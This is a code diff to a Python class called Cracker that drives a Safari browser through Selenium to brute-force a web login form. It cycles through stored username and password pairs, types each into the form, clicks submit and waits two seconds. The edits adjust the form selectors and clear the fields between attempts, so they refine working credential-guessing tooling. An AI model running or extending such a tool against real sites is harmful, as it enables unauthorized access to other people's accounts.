@@ -74,11 +74,13 @@ class Cracker(QThread, HTTPrequest):
         self.Info.emit('Form authentication')
         driver = webdriver.Safari()
         driver.get(self.url_attack)
-        user_box = driver.find_element(By.XPATH, "//form[input/@type='text']")
-        pass_box = driver.find_element(By.XPATH, "//form[input/@type='password']")
-        login = driver.find_element(By.XPATH, "//form[input/@type='submit']")
+        user_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='text']")
+        pass_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='password']")
+        login = driver.find_element(By.XPATH, "//form/fieldset/button[@type='button']")
 
         while self.index < len(self.combinations):
+            user_box.clear()
+            pass_box.clear()
             self.lock_access_file.acquire()  # pedimos acceso al recurso
             [username, password] = self.combinations[self.index]
             self.index += 1
@@ -86,6 +88,7 @@ class Cracker(QThread, HTTPrequest):
             user_box.send_keys(username)
             pass_box.send_keys(password)
             login.click()
+            self.sleep(2)
 
         driver.close()
 
